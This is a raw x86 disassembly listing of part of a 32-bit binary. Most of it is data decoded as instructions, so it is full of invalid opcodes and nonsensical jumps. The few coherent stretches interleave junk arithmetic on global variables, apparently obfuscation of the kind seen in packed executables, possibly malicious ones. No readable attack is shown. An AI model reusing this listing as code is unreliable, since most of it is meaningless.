  4071e7:	ret    
  4071e8:	mov    edi,0x752cfad2
  4071ed:	iret   
  4071ee:	js     0x4071c5
  4071f0:	(bad)  
  4071f1:	stc    
  4071f2:	fnstenv [ebx-0x6a]
  4071f5:	les    eax,FWORD PTR [eax+0x4c]
  4071f8:	push   edx
  4071f9:	ficom  DWORD PTR [eax]
  4071fb:	aad    0xf7
  4071fd:	pop    ecx
  4071fe:	sub    DWORD PTR [esi+0x576673ff],edi
  407204:	cwde   
  407205:	xchg   edx,eax
  407206:	cld    
  407207:	cdq    
  407208:	cli    
  407209:	and    DWORD PTR [esi+0x2ccb0ac8],ebp
  40720f:	sub    ch,BYTE PTR ds:0xbdb9bcdf
  407215:	xchg   ebx,eax
  407216:	sahf   
  407217:	sub    al,0x9f
  407219:	(bad)  
  40721a:	mov    esi,0xb93e6c52
  40721f:	xchg   edi,eax
  407220:	inc    esi
  407221:	inc    ecx
  407222:	stos   BYTE PTR es:[edi],al
  407223:	xchg   ebx,eax
  407224:	adc    DWORD PTR [ebx],ecx
  407226:	std    
  407227:	je     0x407268
  407229:	(bad)
  40722d:	pop    ebp
  40722e:	add    al,0xbe
  407230:	sub    BYTE PTR [eax],ch
  407232:	retf   0xa0d3
  407235:	pop    edi
  407236:	out    0x8c,al
  407238:	pop    ebx
  407239:	(bad)  
  40723a:	stos   BYTE PTR es:[edi],al
  40723b:	test   eax,0x4a15b308
  407240:	xchg   esi,eax
  407241:	pop    ds
  407242:	pop    ebp
  407243:	mov    bl,0x65
  407245:	mov    esi,0x78f1fe5
  40724a:	mov    esp,0xa811da1b
  40724f:	mov    bl,0xef
  407251:	jge    0x407222
  407253:	sub    DWORD PTR [eax+0x2f],0xffffffd1
  407257:	ins    DWORD PTR es:[edi],dx
  407258:	(bad)  
  40725a:	and    edi,edx
  40725c:	ja     0x4071e8
  40725e:	adc    eax,0x6267b62c
  407263:	and    BYTE PTR [edx+0x20c83673],al
  407269:	ins    DWORD PTR es:[edi],dx
  40726a:	or     BYTE PTR [esi+0x40],0xc8
  40726e:	sub    BYTE PTR [ebp+0x1f],bh
  407271:	xor    ebp,ecx
  407273:	mov    ch,0xbc
  407275:	outs   dx,BYTE PTR ds:[esi]
  407276:	push   cs
  407277:	push   0x68
  407279:	test   DWORD PTR [esi],0x585190a3
  40727f:	ss push ebp
  407281:	div    BYTE PTR [edx+0x39]
  407284:	or     cl,BYTE PTR [ebx]
  407286:	sbb    BYTE PTR [ecx+0x5b261f59],al
  40728c:	jp     0x407260
  40728e:	mov    ch,0x4b
  407290:	imul   edx,DWORD PTR [ebx+0x666b6901],0xa7c6f31c
  40729a:	imul   BYTE PTR [esi]
  40729c:	sbb    bh,BYTE PTR [esi+0x4baa08af]
  4072a2:	push   edx
  4072a3:	shl    ecx,1
  4072a5:	ror    edx,1
  4072a7:	out    dx,al
  4072a8:	xchg   esi,eax
  4072a9:	mov    edx,DWORD PTR [edi+0x1b]
  4072ac:	push   edx
  4072ad:	out    dx,al
  4072ae:	je     0x4072cb
  4072b0:	pop    edx
  4072b1:	and    edx,DWORD PTR [esi]
  4072b3:	or     eax,DWORD PTR [esi]
  4072b5:	loop   0x4072a3
  4072b7:	in     eax,0x13
  4072b9:	in     eax,0x8e
  4072bb:	arpl   WORD PTR [ebp-0x587563e3],si
  4072c1:	cmp    BYTE PTR [esi],dh
  4072c3:	xchg   esi,eax
  4072c4:	push   cs
  4072c5:	sub    eax,0xa76d02d2
  4072ca:	jge    0x407337
  4072cc:	cmp    al,BYTE PTR [ebp+esi*2-0x78]
  4072d0:	jmp    0x407294
  4072d2:	adc    ebp,edx
  4072d4:	test   eax,0x3f30f1b7
  4072d9:	sub    BYTE PTR [esi+ebx*4-0x39],ch
  4072dd:	or     esp,DWORD PTR [eax+0x16aa2fd4]
  4072e3:	add    ah,0x51
  4072e6:	sbb    al,0x71
  4072e8:	cs into 
  4072ea:	mov    dh,0xcc
  4072ec:	jmp    0x407276
  4072ee:	lods   eax,DWORD PTR ds:[esi]
  4072ef:	mov    al,0xa8
  4072f1:	paddd  mm0,QWORD PTR gs:[ebx+0x7fafd0ee]
  4072f9:	sub    ch,BYTE PTR [ebp-0x75]
  4072fc:	(bad)  
  4072fe:	cmc    
  4072ff:	mov    cl,dl
  407301:	pavgw  mm5,QWORD PTR [ebx+eax*8]
  407305:	add    ah,BYTE PTR gs:[eax+0x1525821]
  40730c:	jle    0x40729f
  40730e:	push   ecx
  40730f:	das    
  407310:	push   ebx
  407311:	cwde   
  407312:	arpl   ax,si
  407314:	icebp  
  407315:	iret   
  407316:	pop    ebx
  407317:	test   BYTE PTR [ebx+0x22],0x20
  40731b:	xlat   BYTE PTR ds:[ebx]
  40731c:	jecxz  0x407318
  40731e:	lahf   
  40731f:	dec    edi
  407320:	mov    edi,0xe5be7841
  407325:	and    edi,DWORD PTR [esi]
  407327:	fadd   DWORD PTR [edx]
  407329:	inc    ebx
  40732a:	push   0x7244f04c
  40732f:	ret    
  407330:	add    eax,0x8b2a31cc
  407335:	adc    BYTE PTR [ebx],dh
  407337:	xchg   ebp,eax
  407338:	dec    esp
  407339:	jnp    0x4073ae
  40733b:	lds    eax,FWORD PTR [edi+0x6a]
  40733e:	loopne 0x4073ac
  407340:	sub    BYTE PTR [eax-0x694a0e82],bl
  407346:	iret   
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fd51,0x42e783
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fd7d,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e78f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fd7d,0x0
  407384:	mov    eax,ds:0x42fd7d
  407389:	inc    eax
  40738a:	mov    ds:0x42fd7d,eax
  40738f:	cmp    DWORD PTR ds:0x42fd7d,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e4df
  4073a2:	cmp    DWORD PTR ds:0x42fd7d,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fd7d
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fd7d,eax
  4073ba:	cmp    DWORD PTR ds:0x42fd7d,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e1a8,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e787,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	scas   al,BYTE PTR es:[edi]
  4073fc:	sbb    DWORD PTR [edi],ecx
  4073fe:	int3   
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	mov    esi,0x9cb28887
  40740c:	push   0x4d6a3f6e
  407411:	inc    esp
  407412:	and    eax,0xadd10fcd
  407417:	fcmovb st,st(6)
  407419:	and    ah,BYTE PTR [edi+0x4190eafa]
  40741f:	mov    ebp,0xe70d58de
  407424:	cwde   
  407425:	ins    DWORD PTR es:[edi],dx
  407426:	adc    esp,DWORD PTR [edx+0x345e2519]
  40742c:	pop    ecx
  40742d:	iret   
  40742e:	nop
  40742f:	cdq    
  407430:	adc    eax,0x532b6f14
  407435:	jmp    0x66d3dfbc
  40743a:	hlt    
  40743b:	loop   0x4073cf
  40743d:	and    DWORD PTR [edi],ebx
  40743f:	adc    eax,0xb6828594
  407444:	jecxz  0x407446
  407446:	push   ds
  407447:	jp     0x407405
  407449:	xchg   ecx,eax
  40744a:	in     eax,dx
  40744b:	jno    0x4074a1
  40744d:	add    DWORD PTR [ebx-0x31138066],ebp
  407453:	inc    esi
  407454:	push   ds
  407455:	dec    esi
  407456:	mov    esp,eax
  407458:	test   al,0x89
  40745a:	fimul  DWORD PTR [edi+0x2b]
  40745d:	mov    esi,0x185069af
  407462:	sub    BYTE PTR ss:[esi+0x36831cda],0x82
  40746a:	je     0x407474
  40746c:	and    bl,al
  40746e:	and    BYTE PTR ds:[esi],cl
  407471:	push   0x6a
  407473:	pop    eax
  407475:	(bad)  
  407476:	mov    eax,ds:0x46781a54
  40747b:	xor    eax,0x364e121d
  407480:	(bad)  
  407481:	bound  eax,QWORD PTR [edi]
  407483:	sub    dh,BYTE PTR [eax]
  407485:	and    DWORD PTR [eax],ebx
  407487:	adc    al,0x67
  407489:	pop    es
  40748a:	add    al,0xeb
  40748c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40748e:	jle    0x40744f
  407490:	adc    BYTE PTR [ebx],cl
  407492:	mov    cl,BYTE PTR [ecx-0x2d5ce64a]
  407498:	jge    0x407444
  40749a:	sti    
  40749b:	push   es
  40749c:	mov    eax,ds:0x330ac123
  4074a1:	div    ah
  4074a3:	dec    ecx
  4074a4:	ds mov al,0x75
  4074a7:	fwait
  4074a8:	pop    edx
  4074a9:	adc    bl,BYTE PTR [ebp-0x1fc200bf]
  4074af:	jae    0x4074c7
  4074b1:	jp     0x407514
  4074b3:	(bad)  
  4074b4:	bnd jbe 0x407488
  4074b7:	arpl   bp,di
  4074b9:	jecxz  0x4074bd
  4074bb:	push   es
  4074bc:	lds    esp,FWORD PTR [esi*1+0x18970010]
  4074c3:	adc    al,0x39
  4074c5:	push   ds
  4074c6:	lods   eax,DWORD PTR ds:[esi]
  4074c7:	inc    esp
  4074c8:	push   0xd0c1653
  4074cd:	hlt    
  4074ce:	jmp    0x5573:0xf1cb396c
  4074d5:	or     eax,0x206bea83
  4074da:	jmp    0x37c4a535
  4074df:	sar    BYTE PTR [esi-0x2e62afa6],0xb6
  4074e6:	neg    esi
  4074e8:	int3   
  4074e9:	imul   ebp,DWORD PTR [edi],0xe750521a
  4074ef:	verr   WORD PTR [edi-0x48]
  4074f3:	mov    eax,0xcf1f7652
  4074f8:	dec    esp
  4074f9:	sub    BYTE PTR [edx-0x5786c560],ch
  4074ff:	daa    
  407500:	add    DWORD PTR [esi-0x8],eax
  407503:	fadd   QWORD PTR [ecx+0x40e5f5a9]
  407509:	add    edi,ebp
  40750b:	test   DWORD PTR [esi+0x1bd7c7ef],ebp
  407511:	test   edi,esp
  407513:	hlt    
  407514:	idiv   BYTE PTR [ebx]
  407516:	xchg   DWORD PTR [edx],edx
  407518:	iret   
  407519:	pop    esp
  40751a:	mov    bh,0x5c
  40751c:	xchg   al,bh
  40751e:	add    dl,dh
  407520:	pop    esi
  407521:	inc    ecx
  407522:	repnz push es
  407524:	sbb    DWORD PTR [edi+0xf86eacc],edx
  40752a:	sbb    al,BYTE PTR [esi-0x36b1649c]
  407530:	ret    
  407531:	push   0x3dc7d6f0
  407536:	aaa    
  407537:	cwde   
  407538:	or     BYTE PTR [ebp+esi*2+0x38116ea4],0xc7
  407540:	mov    cl,0x6
  407542:	sbb    DWORD PTR [edi],0xffffffc5
  407545:	jne    0x40756d
  407547:	xchg   esp,eax
  407548:	adc    al,0x2d
  40754a:	xchg   esi,eax
  40754b:	add    al,0xf7
  40754d:	sbb    ah,ah
  40754f:	push   cs
  407550:	pop    ecx
  407551:	inc    ebx
  407552:	addr16 xor ah,dl
  407555:	daa    
  407556:	inc    ecx
  407557:	mov    esi,0x460e8c24
  40755c:	es mov edx,0x6df035b4
  407562:	(bad)  
  407563:	and    BYTE PTR ds:0x21d71239,cl
  407569:	mov    cl,0xc0
  40756b:	cdq    
  40756c:	add    DWORD PTR [esp+ecx*4],esp
  40756f:	nop
  407570:	icebp  
  407571:	or     esi,edi
  407573:	retf   
  407574:	fs dec ecx
  407576:	add    ecx,DWORD PTR [edx+eiz*1-0x3ec6c204]
  40757d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757e:	inc    ebp
  40757f:	(bad)  
  407580:	js     0x40754a
  407582:	jmp    0x38cc33c7
  407587:	push   0xffffff91
  407589:	mov    bl,0x84
  40758b:	in     al,0xe5
  40758d:	fs pop ebp
  40758f:	jae    0x4075a8
  407591:	repnz dec esi
  407593:	mov    al,0xd5
  407595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407596:	test   BYTE PTR [eax],0x23
  407599:	(bad)  
  40759a:	sub    edx,DWORD PTR [ebx+0x7361df41]
  4075a0:	arpl   bx,sp
  4075a2:	mov    cl,0x25
  4075a4:	pop    ebx
  4075a5:	or     edi,DWORD PTR [eax+0x3d896419]
  4075ab:	(bad)  
  4075ac:	and    ecx,DWORD PTR [ecx-0x7b]
  4075af:	xchg   edi,eax
  4075b0:	fwait
  4075b1:	push   0xe297809f
  4075b6:	cld    
  4075b7:	jo     0x40757e
  4075b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ba:	bound  eax,QWORD PTR [esi+0x112b3dea]
  4075c0:	pop    esp
  4075c1:	iret   
  4075c2:	mov    ebx,0xe17b861b
  4075c7:	sub    bl,BYTE PTR [esi+0x4d931ab4]
  4075cd:	cmp    eax,0x68144f3
  4075d2:	adc    ch,dh
  4075d4:	mov    cl,0x7e
  4075d6:	das    
  4075d7:	test   al,0x85
  4075d9:	inc    ebp
  4075da:	rol    DWORD PTR [eax+ecx*1+0x38],0x99
  4075df:	inc    esi
  4075e0:	les    ebx,FWORD PTR [edi-0x71]
  4075e3:	cmp    al,0x90
  4075e5:	out    0xe0,eax
  4075e7:	xchg   ebp,eax
  4075e8:	aas    
  4075e9:	pop    ecx
  4075ea:	cmp    eax,DWORD PTR [edx+0x12349c10]
  4075f0:	lds    ebx,FWORD PTR [ebp+0x33]
  4075f3:	call   0x15a0662c
  4075f8:	rcr    BYTE PTR [esi-0x12],cl
  4075fb:	inc    ebp
  4075fc:	cmp    DWORD PTR [esi+0x33],0x33
  407600:	jns    0x4075e8
  407602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407603:	cmp    DWORD PTR [edx],edi
  407605:	jl     0x407651
  407607:	les    esp,FWORD PTR [edi+0x53eced78]
  40760d:	add    ecx,DWORD PTR [ebx+0x3153bf21]
  407613:	lods   al,BYTE PTR ds:[esi]
  407614:	pop    edi
  407615:	jno    0x4075e6
  407617:	mov    bl,0xd1
  407619:	iret   
  40761a:	fnstenv [ebp+0x77]
  40761d:	xlat   BYTE PTR ds:[ebx]
  40761e:	daa    
  40761f:	inc    edx
  407620:	xor    ebp,esi
  407622:	xor    ebp,DWORD PTR [ebp+0x49ef5b23]
  407628:	push   edi
  407629:	daa    
  40762a:	pop    eax
  40762b:	retf   
  40762c:	in     eax,dx
  40762d:	sahf   
  40762e:	mov    edi,esi
  407630:	scas   eax,DWORD PTR es:[edi]
  407631:	push   ebp
  407632:	cli    
  407633:	push   0x89ac55dd
  407638:	mov    ebx,0xf2f94e55
  40763d:	dec    ebx
  40763e:	ss pop edi
  407640:	std    
  407641:	rcr    BYTE PTR [eax+ebx*8-0x128316c1],0xbb
  407649:	pop    es
  40764a:	fimul  WORD PTR [esi-0x67]
  40764d:	mov    al,ds:0x331201ae
  407652:	ret    
  407653:	ins    BYTE PTR es:[edi],dx
  407654:	call   0x9512:0x8b5f22ab
  40765b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40765c:	mov    dl,0xe7
  40765e:	lock in al,dx
  407660:	enter  0xac06,0xa2
  407664:	in     eax,dx
  407665:	ja     0x407637
  407667:	pop    edx
  407668:	cmc    
  407669:	jge    0x407692
  40766b:	pop    ecx
  40766d:	and    dl,ch
  40766f:	sbb    DWORD PTR [eax+0x22],esp
  407672:	xchg   DWORD PTR [edx+0x2d09e35a],edx
  407678:	xchg   ecx,eax
  407679:	jmp    0x27af55f6
  40767e:	pop    esp
  40767f:	in     al,0x32
  407681:	daa    
  407682:	rcr    ebx,cl
  407684:	and    eax,0x70c556a6
  407689:	mov    WORD PTR fs:[esi+0x1564b8c9],?
  407690:	cmp    edi,DWORD PTR [ecx+0x46231fd]
  407696:	or     bh,ch
  407698:	inc    edi
  407699:	dec    ebx
  40769a:	ds inc eax
  40769c:	mov    ch,0xf5
  40769e:	mov    BYTE PTR [edi-0xe],ah
  4076a1:	int    0xda
  4076a3:	inc    eax
  4076a4:	imul   ebx,DWORD PTR [edx+esi*1+0xd637eb1],0x38
  4076ac:	into   
  4076ad:	add    ebx,DWORD PTR [ebx+0x18afc332]
  4076b3:	cmp    al,0x5b
  4076b5:	arpl   WORD PTR [edi-0x40],cx
  4076b8:	push   ecx
  4076b9:	popa   
  4076ba:	js     0x407734
  4076bc:	and    al,0xed
  4076be:	(bad)  
  4076bf:	loop   0x407671
  4076c1:	popa   
  4076c2:	retf   0xf453
  4076c5:	push   ebp
  4076c6:	ja     0x407722
  4076c8:	fwait
  4076c9:	sahf   
  4076ca:	dec    edi
  4076cb:	jmp    DWORD PTR [eax+0x5e3909e]
  4076d1:	retf   0xe0be
  4076d4:	lahf   
  4076d5:	aad    0x7b
  4076d7:	xor    al,0x5a
  4076d9:	inc    esi
  4076da:	hlt    
  4076db:	repz sub eax,0x6114b56d
  4076e1:	xchg   ecx,eax
  4076e2:	(bad)  [eax+eax*2]
  4076e6:	dec    ecx
  4076e7:	and    al,0x5e
  4076e9:	xchg   ebp,eax
  4076ea:	xchg   edi,eax
  4076eb:	or     ebx,eax
  4076ed:	xor    dh,BYTE PTR ds:0x343f1b68
  4076f3:	mov    fs,WORD PTR [eax+0x11e6ebb3]
  4076f9:	fstp   QWORD PTR [ecx]
  4076fb:	pusha  
  4076fc:	(bad)  
  4076fe:	xchg   ecx,eax
  4076ff:	sub    al,0x9
  407701:	test   ecx,esp
  407703:	psraw  mm3,QWORD PTR [edx]
  407706:	test   BYTE PTR [ebx],dl
  407708:	cld    
  407709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40770a:	cmp    al,0xcb
  40770c:	mov    DWORD PTR [eax+0x3f],0xc584024d
  407713:	mov    cl,0x42
  407715:	pop    es
  407716:	mov    ebp,0x5aaf25d2
  40771b:	jecxz  0x40778d
  40771d:	enter  0x9e8f,0x6a
  407721:	sar    DWORD PTR [eax],1
  407723:	repz cli 
  407725:	cli    
  407726:	aas    
  407727:	mov    WORD PTR [ebx-0x4710376],es
  40772d:	adc    al,0x92
  40772f:	std    
  407730:	mov    ecx,0x5b2dccef
  407735:	std    
  407736:	cwde   
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e19c,0x42fd89
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fd51,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e76f,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fd71,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e78f,0x42e76b
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e77f,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e783,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fd65,0x42fdee
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fe02,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	mov    ds:0xa79ef01a,al
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x4077f0
  4077e6:	in     eax,dx
  4077e7:	out    dx,al
  4077e8:	loop   0x40783d
  4077ea:	mov    ebx,0x1dc75be2
  4077ef:	retf   0x5598
  4077f2:	mov    al,0x44
  4077f4:	jb     0x407837
  4077f6:	add    ecx,DWORD PTR [ebx]
  4077f8:	call   DWORD PTR [ebx-0x7d]
  4077fb:	leave  
  4077fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077fd:	pusha  
  4077fe:	repz pop esp
  407800:	daa    
  407801:	mov    ebp,0x4ccab43
  407806:	cmc    
  407807:	dec    ebx
  407808:	mov    edi,0x44318a65
  40780d:	ror    BYTE PTR [ebx-0x4d],cl
  407810:	cli    
  407811:	inc    edi
  407812:	mov    gs,WORD PTR [ebp-0x6f4330e3]
  407818:	scas   eax,DWORD PTR es:[edi]
  407819:	xchg   BYTE PTR [edi+0x19922f0e],dh
  40781f:	das    
  407820:	movlps QWORD PTR [edx-0x31],xmm7
  407824:	sub    edx,DWORD PTR gs:[edx-0x43]
  407828:	xor    DWORD PTR [esi+0x18],edx
  40782b:	mov    ch,BYTE PTR [eiz*8-0x7c929faf]
  407832:	sete   BYTE PTR [edx+0x25c85e7]
  407839:	add    eax,0x98f14394
  40783e:	push   ebx
  40783f:	jo     0x4077d7
  407841:	pop    ebx
  407842:	push   0xb0e6095a
  407847:	push   ebx
  407848:	inc    edi
  407849:	mov    ch,0xa6
  40784b:	jp     0x4077d5
  40784d:	pop    es
  40784e:	pop    esp
  40784f:	dec    edx
  407850:	les    esp,FWORD PTR [ebx+0x1b]
  407853:	in     eax,dx
  407854:	pop    ebx
  407855:	mov    bl,dl
  407857:	mov    bh,BYTE PTR [edx]
  407859:	stc    
  40785a:	xchg   esp,eax
  40785b:	(bad)  
  40785c:	fisttp DWORD PTR [edx-0x28]
  40785f:	cdq    
  407860:	nop
  407861:	ret    0x876
  407864:	mov    ebp,0x30d49214
  407869:	sub    dh,al
  40786b:	shl    DWORD PTR [ecx+0x7ac95948],1
  407871:	push   es
  407872:	add    ch,BYTE PTR [ecx-0x64]
  407875:	add    dl,BYTE PTR [edx]
  407877:	mov    dl,0x4c
  407879:	push   esp
  40787a:	and    al,BYTE PTR [ebx-0x1cd2abe2]
  407880:	(bad)  
  407881:	mov    edx,0x534c8bab
  407886:	fdiv   QWORD PTR [ebp+0x2b]
  407889:	dec    ebx
  40788a:	pusha  
  40788b:	sbb    bh,bh
  40788d:	or     eax,0x53164b8d
  407892:	imul   edx,DWORD PTR [edx+eax*2],0xb4786827
  407899:	add    eax,0x656852eb
  40789e:	inc    eax
  40789f:	sub    DWORD PTR cs:[edi+0x6e],esi
  4078a3:	push   ss
  4078a4:	or     DWORD PTR [eax+ebx*8+0x6b],edx
  4078a8:	mov    eax,0xf87e890f
  4078ad:	mov    ss,ebp
  4078af:	pop    es
  4078b0:	ret    0xcae5
  4078b3:	push   es
  4078b4:	dec    eax
  4078b5:	xchg   esp,eax
  4078b6:	data16 hlt 
  4078b8:	inc    ebx
  4078b9:	xchg   BYTE PTR [eax-0x706034c3],dh
  4078bf:	imul   edi,DWORD PTR [esi],0xffffffbe
  4078c2:	in     al,0x28
  4078c4:	jb     0x407911
  4078c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078c7:	add    eax,0xdf0c1578
  4078cc:	pop    ds
  4078cd:	cwde   
  4078ce:	dec    edx
  4078cf:	fbld   TBYTE PTR [ebx+0x1974005]
  4078d5:	and    esp,DWORD PTR [ebx-0x42d8a3fa]
  4078db:	push   esp
  4078dc:	push   eax
  4078dd:	cmc    
  4078de:	jp     0x4078a6
  4078e0:	leave  
  4078e1:	jno    0x407919
  4078e3:	mov    WORD PTR [eax],fs
  4078e5:	or     esp,DWORD PTR [edx]
  4078e7:	add    eax,0x36feab9f
  4078ec:	cli    
  4078ed:	pushf  
  4078ee:	mov    edi,0x15c20860
  4078f3:	in     al,0xf4
  4078f5:	ror    BYTE PTR [ecx-0x43],cl
  4078f8:	inc    esp
  4078f9:	mov    ch,0x30
  4078fb:	mov    dl,0xd3
  4078fd:	cld    
  4078fe:	mov    bh,BYTE PTR [esi+0x4a]
  407901:	repnz mov ecx,0x52447965
  407907:	lock xor BYTE PTR [ecx-0x57],bh
  40790b:	ror    DWORD PTR [ebp-0x17dcb879],1
  407911:	dec    esi
  407912:	aam    0x4b
  407914:	sbb    eax,0xf7bd8949
  407919:	or     DWORD PTR [ecx],edi
  40791b:	out    0xcc,al
  40791d:	enter  0x9615,0x69
  407921:	pop    edx
  407922:	jns    0x407913
  407924:	jno    0x407926
  407926:	xchg   esp,eax
  407927:	jae    0x4078e5
  407929:	pop    edi
  40792a:	gs stc 
  40792c:	lea    edi,ds:0x5826696f
  407932:	or     eax,0xd523880e
  407937:	jns    0x4078ff
  407939:	fxam   
  40793b:	test   BYTE PTR [esi+0x299eb286],0x2d
  407942:	leave  
  407943:	dec    ecx
  407944:	xor    eax,0xba643fef
  407949:	mov    BYTE PTR [edi],ah
  40794b:	jo     0x407981
  40794d:	inc    esp
  40794e:	mov    edx,edi
  407950:	lock sbb ah,al
  407953:	mov    ah,0x4d
  407955:	jo     0x407946
  407957:	iret   
  407958:	add    dh,BYTE PTR [ecx-0x420347d7]
  40795e:	cmp    BYTE PTR [esi-0x46],bl
  407961:	fistp  DWORD PTR [esi]
  407963:	push   cs
  407964:	jge    0x40795b
  407966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407967:	cli    
  407968:	into   
  407969:	popf   
  40796a:	lds    edx,FWORD PTR [ebp+eiz*2+0x7e9d4eaf]
  407971:	jle    0x40791a
  407973:	sub    eax,0x4e1246a3
  407978:	push   cs
  407979:	xchg   esp,eax
  40797a:	add    edi,DWORD PTR [edx]
  40797c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40797d:	into   
  40797e:	jae    0x40799a
  407980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407981:	test   BYTE PTR [ebx],ch
  407983:	enter  0xab5a,0xe9
  407987:	push   esp
  407988:	xchg   ecx,esp
  40798a:	mov    eax,ds:0x920225d8
  40798f:	push   eax
  407990:	stos   BYTE PTR es:[edi],al
  407991:	and    ah,BYTE PTR [edx+0x47]
  407994:	(bad)  
  407995:	repnz out dx,eax
  407997:	cmp    esp,DWORD PTR [esi]
  407999:	test   BYTE PTR [ebx+ebp*8-0x2e],dh
  40799d:	cmp    al,0xb3
  40799f:	loopne 0x407a0d
  4079a1:	mov    WORD PTR [ebp-0x33],?
  4079a4:	jo     0x407990
  4079a6:	ins    BYTE PTR es:[edi],dx
  4079a7:	cmp    al,0x51
  4079a9:	push   ebx
  4079aa:	sbb    al,0x96
  4079ac:	lea    edx,[edx]
  4079ae:	pop    es
  4079af:	and    eax,DWORD PTR [ecx-0x163a3239]
  4079b5:	aaa    
  4079b6:	xor    ah,cl
  4079b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079b9:	pop    ebp
  4079ba:	mov    eax,0x65b1e1ac
  4079bf:	dec    eax
  4079c0:	inc    edi
  4079c1:	pop    ds
  4079c2:	cmp    BYTE PTR [ebx+0x58],dl
  4079c5:	cdq    
  4079c6:	add    edi,edi
  4079c8:	daa    
  4079c9:	adc    ah,ah
  4079cb:	jle    0x407a48
  4079cd:	sar    edx,cl
  4079cf:	into   
  4079d0:	repnz lods al,BYTE PTR ds:[esi]
  4079d2:	dec    ecx
  4079d3:	cs dec esp
  4079d5:	shl    DWORD PTR [eax+0x4f9376b3],cl
  4079db:	div    dh
  4079dd:	push   edi
  4079de:	and    BYTE PTR [edi+0x3b],ch
  4079e1:	retf   
  4079e2:	sbb    BYTE PTR [edx+0x53],ch
  4079e5:	imul   edi,DWORD PTR [ecx+0x3f],0x48
  4079e9:	fsubr  DWORD PTR [ecx+0x44a9a410]
  4079ef:	inc    eax
  4079f0:	rcl    BYTE PTR [edi-0x6b],1
  4079f3:	xchg   ebx,eax
  4079f4:	cs adc eax,0x802a784d
  4079fa:	test   eax,0x650c24e0
  4079ff:	jae    0x4079c7
  407a01:	fistp  QWORD PTR [ebp+0x11]
  407a04:	xchg   ecx,eax
  407a05:	pop    esi
  407a06:	adc    eax,0x94ef616d
  407a0b:	mov    ebx,0x93de4e6c
  407a10:	jns    0x407a20
  407a12:	or     eax,0x7c38458b
  407a17:	jp     0x4079ac
  407a19:	in     eax,dx
  407a1a:	call   0xcdec:0xd9fe2f8c
  407a21:	(bad)  
  407a22:	and    bl,BYTE PTR [edi-0x68]
  407a25:	push   0xffffffcb
  407a27:	cmp    al,0x20
  407a29:	shl    al,1
  407a2b:	jno    0x4079b2
  407a2d:	ss daa 
  407a2f:	adc    ecx,DWORD PTR ds:0x95e95541
  407a35:	daa    
  407a36:	fisub  DWORD PTR [ebx+ecx*4]
  407a39:	sahf   
  407a3a:	js     0x407a72
  407a3c:	test   eax,0x36d259c7
  407a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a42:	mov    dl,ch
  407a44:	ja     0x407ab9
  407a46:	mov    eax,ds:0x3883ab83
  407a4b:	pushf  
